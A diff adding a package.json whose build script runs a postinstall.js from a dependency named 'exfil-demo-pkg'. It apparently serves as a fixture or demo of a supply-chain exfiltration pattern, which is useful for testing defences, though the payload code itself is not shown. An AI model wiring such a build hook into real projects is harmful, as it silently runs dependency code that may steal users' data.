@@ -1,0 +1,10 @@
+{
+  "name": "live-integration-app",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "node node_modules/exfil-demo-pkg/postinstall.js"
+  },
+  "dependencies": {
+    "exfil-demo-pkg": "1.0.0"
+  }
+}
